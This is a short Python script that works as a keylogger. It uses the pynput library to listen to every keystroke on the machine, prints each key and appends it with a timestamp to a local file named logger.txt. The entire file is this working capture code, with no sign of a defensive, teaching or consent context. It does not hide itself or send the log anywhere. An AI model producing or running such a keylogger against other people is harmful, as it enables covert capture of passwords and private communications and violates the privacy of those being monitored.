import datetime
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def writeToFile(Key):
    with open("logger.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} : {str(Key)}\n")


def on_press(Key):
    global keys, count
    keys.append(Key)
    count += 1
    print(f"{Key} pressed")
    writeToFile(Key)
    
    if count >= 10:
        count = 0
        keys = []
    

if __name__ == "__main__":
    
    with Listener(on_press=on_press) as listener:
        listener.join()

    
